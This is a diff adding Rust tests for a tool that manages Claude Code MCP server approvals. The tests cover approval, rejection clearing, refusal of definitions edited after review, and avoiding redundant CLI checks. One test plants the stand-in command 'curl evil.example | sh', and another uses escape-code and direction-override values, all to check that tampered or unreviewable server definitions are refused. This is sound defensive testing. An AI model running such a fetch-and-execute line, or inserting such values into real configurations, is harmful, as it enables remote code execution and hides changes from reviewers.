+        // The user's own file was not touched, so there is no backup of it either.
+        assert_eq!(
+            std::fs::read_to_string(env.dir.path().join("cfg").join(".claude.json")).unwrap(),
+            claude_json_before
+        );
+        assert_eq!(approval_in(&events), Some(crate::api::Approval::Approved));
+    }
+
+    /// The approval of `ps` in the last snapshot among `events`.
+    fn approval_in(events: &[Event]) -> Option<crate::api::Approval> {
+        events.iter().rev().find_map(|e| match e {
+            Event::Snapshot(s) => s
+                .servers
+                .iter()
+                .find(|r| r.name == "ps")
+                .and_then(|r| r.approval),
+            _ => None,
+        })
+    }
+
+    #[test]
+    fn approving_a_server_that_was_rejected_clears_the_rejection_in_both_places() {
+        let (env, key, repo) =
+            repo_env(serde_json::json!({"disabledMcpjsonServers": ["ps", "other"]}));
+        std::fs::create_dir_all(repo.join(".claude")).unwrap();
+        std::fs::write(
+            repo.join(".claude").join("settings.local.json"),
+            r#"{"disabledMcpjsonServers":["ps"],"keep":true}"#,
+        )
+        .unwrap();
+        let core = env.start();
+        let plan = plan_for(&core, approve(&key));
+        assert_eq!(
+            plan.files.len(),
+            2,
+            "the settings file and ~/.claude.json: {:?}",
+            plan.files
+        );
+        let events = apply_and_wait(&core, &plan);
+        assert_eq!(
+            settings_of(&repo),
+            Some(
+                serde_json::json!({"disabledMcpjsonServers": [], "keep": true, "enabledMcpjsonServers": ["ps"]})
+            )
+        );
+        assert_eq!(
+            config_json(&env)["projects"][&key]["disabledMcpjsonServers"],
+            serde_json::json!(["other"])
+        );
+        assert_eq!(approval_in(&events), Some(crate::api::Approval::Approved));
+    }
+
+    #[test]
+    fn a_server_that_is_already_approved_needs_nothing() {
+        let (env, key, repo) = repo_env(serde_json::json!({"enabledMcpjsonServers": ["ps"]}));
+        let core = env.start();
+        let plan = plan_for(&core, approve(&key));
+        assert!(plan.nothing_to_do && plan.reviews.is_empty() && plan.warnings.is_empty());
+        apply_and_wait(&core, &plan);
+        assert!(!repo.join(".claude").exists());
+    }
+
+    #[test]
+    fn a_definition_edited_after_review_is_not_approved() {
+        let (env, key, repo) = repo_env(serde_json::json!({}));
+        let core = env.start();
+        let plan = plan_for(&core, approve(&key));
+        std::fs::write(
+            repo.join(".mcp.json"),
+            MCP_JSON.replace("\"node\"", "\"curl evil.example | sh\""),
+        )
+        .unwrap();
+        let events = apply_and_wait(&core, &plan);
+        let error = events
+            .iter()
+            .find_map(|e| match e {
+                Event::ApplyFailed { error, .. } => Some(error.clone()),
+                _ => None,
+            })
+            .expect("refused");
+        assert!(
+            error.contains("changed") && error.contains("review it again"),
+            "{error}"
+        );
+        assert!(!repo.join(".claude").exists());
+    }
+
+    #[test]
+    fn a_server_removed_after_review_is_not_approved_either() {
+        let (env, key, repo) = repo_env(serde_json::json!({}));
+        let core = env.start();
+        let plan = plan_for(&core, approve(&key));
+        std::fs::remove_file(repo.join(".mcp.json")).unwrap();
+        let events = apply_and_wait(&core, &plan);
+        assert!(
+            events
+                .iter()
+                .any(|e| matches!(e, Event::ApplyFailed { .. }))
+        );
+        assert!(!repo.join(".claude").exists());
+    }
+
+    #[test]
+    fn a_server_that_cannot_be_shown_whole_is_not_offered_for_approval() {
+        for definition in [
+            r#"{"command":"no\u001b[2Kde"}"#,
+            r#"{"command":"node","args":["a\u202eb"]}"#,
+            r#"{"type":"carrier-pigeon"}"#,
+            r#"{"command":"node","args":[1]}"#,
+        ] {
+            let (env, key, repo) = repo_env(serde_json::json!({}));
+            std::fs::write(
+                repo.join(".mcp.json"),
+                format!(r#"{{"mcpServers":{{"ps":{definition}}}}}"#),
+            )
+            .unwrap();
+            let core = env.start();
+            core.send(Command::Prepare(approve(&key)));
+            let events = collect(&core, |e| {
+                e.iter()
+                    .any(|x| matches!(x, Event::PlanFailed(_) | Event::PlanReady(_)))
+            });
+            assert!(
+                events.iter().any(
+                    |e| matches!(e, Event::PlanFailed(m) if m.contains("cannot be reviewed safely"))
+                ),
+                "{definition}: {events:#?}"
+            );
+            assert!(!repo.join(".claude").exists());
+        }
+    }
+
+    #[test]
+    fn only_project_servers_can_be_approved() {
+        let env = quiet_env(&two_projects("end"));
+        let core = env.start();
+        core.send(Command::Prepare(vec![Change::Approve {
+            id: user_id("gw"),
+        }]));
+        let events = collect(&core, |e| {
+            e.iter().any(|x| matches!(x, Event::PlanFailed(_)))
+        });
+        assert!(
+            events
+                .iter()
+                .any(|e| matches!(e, Event::PlanFailed(m) if m.contains("needs no approval")))
+        );
+    }
+
+    #[test]
+    fn the_ignore_warning_goes_away_when_the_repository_ignores_the_file() {
+        let (env, key, repo) = repo_env(serde_json::json!({}));
+        std::fs::write(repo.join(".gitignore"), ".claude/settings.local.json\n").unwrap();
+        let core = env.start();
+        let plan = plan_for(&core, approve(&key));
+        assert!(
+            !plan.warnings.iter().any(|w| w.contains(".gitignore")),
+            "{:?}",
+            plan.warnings
+        );
+        assert!(
+            plan.warnings
+                .iter()
+                .any(|w| w.contains("trust the repository"))
+        );
+    }
+
+    #[test]
+    fn a_failure_after_the_first_file_says_what_was_already_saved() {
+        let (env, key, repo) = repo_env(serde_json::json!({"disabledMcpjsonServers": ["ps"]}));
+        let core = env.start();
+        let plan = plan_for(&core, approve(&key));
+        // Claude holds its lock, so the second file (~/.claude.json) cannot be written.
+        std::fs::create_dir(env.dir.path().join("cfg").join(".claude.json.lock")).unwrap();
+        let events = apply_and_wait(&core, &plan);
+        let error = events
+            .iter()
+            .find_map(|e| match e {
+                Event::ApplyFailed { error, .. } => Some(error.clone()),
+                _ => None,
+            })
+            .unwrap();
+        assert!(
+            error.contains("writing its configuration")
+                && error.contains("Already saved")
+                && error.contains("settings.local.json"),
+            "{error}"
+        );
+        assert_eq!(
+            settings_of(&repo),
+            Some(serde_json::json!({"enabledMcpjsonServers": ["ps"]}))
+        );
+        // The rejection in ~/.claude.json is still there, so the server is still shown as rejected.
+        assert_eq!(
+            config_json(&env)["projects"][&key]["disabledMcpjsonServers"],
+            serde_json::json!(["ps"])
+        );
+    }
+
+    // ---- not spawning what is not needed
+
+    impl Env {
+        /// How many times the fake CLI was started with these leading arguments.
+        fn runs(&self, leading: &[&str]) -> usize {
+            std::fs::read_to_string(&self.log)
+                .unwrap_or_default()
+                .lines()
+                .map(|l| serde_json::from_str::<serde_json::Value>(l).unwrap())
+                .filter(|l| l["event"] == "start")
+                .filter(|l| {
+                    let argv = l["argv"].as_array().unwrap();
+                    argv.len() >= leading.len()
+                        && leading.iter().zip(argv).all(|(want, got)| got == want)
+                })
+                .count()
+        }
+    }
+
+    const CHECKABLE: &str = r#"{"rules":[
+        {"args":["--version"],"stdout_file":"version.txt"},
+        {"args":["mcp","get"],"stdout_file":"connected.txt"}]}"#;
+
+    fn checkable_env(claude_json: &serde_json::Value) -> Env {
+        Env::new(
+            claude_json,
+            CHECKABLE,
+            &[
+                ("version.txt", b"2.1.302 (Claude Code)\n"),
+                ("connected.txt", CONNECTED),
+            ],
+        )
+    }
+
+    #[test]
+    fn the_cli_version_is_asked_once_not_on_every_refresh() {
+        let env = checkable_env(&two_projects("end"));
+        let core = env.start();
+        collect(&core, |e| {
+            e.iter().any(|x| matches!(x, Event::CliVersion(Some(_))))
+                && final_status(e, "gw").is_some()
+        });
+        for _ in 0..3 {
+            core.send(Command::Refresh { live_all: false });
+            collect(&core, |e| {
+                e.iter().any(|x| matches!(x, Event::CliVersion(Some(_))))
+            });
+        }
+        assert_eq!(env.runs(&["--version"]), 1);
+    }
+
+    /// `gw` (user) and `loc` (local, in a project folder that exists), both checkable. Returns the project key.
+    fn checkable_with_project(loc_off: bool) -> (Env, String) {
+        let env = checkable_env(&serde_json::json!({}));
+        let project = env.dir.path().join("proj");
+        std::fs::create_dir_all(&project).unwrap();
+        let key = project.to_string_lossy().replace('\\', "/");
+        let disabled: Vec<&str> = if loc_off { vec!["loc"] } else { vec![] };
+        write_config(
+            &env,
+            &serde_json::json!({
+                "mcpServers": {"gw": {"type": "stdio", "command": "node"}},
+                "projects": {key.clone(): {
+                    "mcpServers": {"loc": {"type": "stdio", "command": "x"}},
+                    "disabledMcpServers": disabled
+                }}
+            }),
+        );
+        let key = inventory::normalise_project(&key);
+        (env, key)
+    }
+
+    #[test]
+    fn saving_a_change_neither_re_checks_servers_nor_asks_the_version_again() {
+        let (env, key) = checkable_with_project(false);
+        let core = env.start();
+        collect(&core, |e| {
+            final_status(e, "gw") == Some(Status::Connected)
+                && final_status(e, "loc") == Some(Status::Connected)
+        });
+        let plan = plan_for(
+            &core,
+            vec![Change::SetEnabled {
+                id: local_id("loc", &key),
+                enabled: false,
+            }],
+        );
+        core.send(Command::Apply(plan.id));
+        collect(&core, |e| {
+            e.iter().any(|x| matches!(x, Event::Applied { .. }))
+        });
+        // Give a stray check time to start, if one were queued.
+        std::thread::sleep(Duration::from_millis(400));
+        assert_eq!(env.runs(&["mcp", "get", "gw"]), 1, "gw did not change");
+        assert_eq!(env.runs(&["mcp", "get", "loc"]), 1, "loc was switched off");
+        assert_eq!(env.runs(&["--version"]), 1);
+    }
+
+    #[test]
+    fn a_server_switched_on_by_a_change_is_checked() {
+        let (env, key) = checkable_with_project(true);
+        let core = env.start();
+        collect(&core, |e| final_status(e, "gw") == Some(Status::Connected));
+        assert_eq!(
+            env.runs(&["mcp", "get", "loc"]),
+            0,
+            "off servers are not checked"
+        );
+        let plan = plan_for(
+            &core,
+            vec![Change::SetEnabled {
+                id: local_id("loc", &key),
+                enabled: true,
+            }],
+        );
+        core.send(Command::Apply(plan.id));
+        collect(&core, |e| final_status(e, "loc") == Some(Status::Connected));
+        assert_eq!(env.runs(&["mcp", "get", "loc"]), 1);
+        assert_eq!(env.runs(&["mcp", "get", "gw"]), 1);
+        assert_eq!(env.runs(&["--version"]), 1);
     }
 }
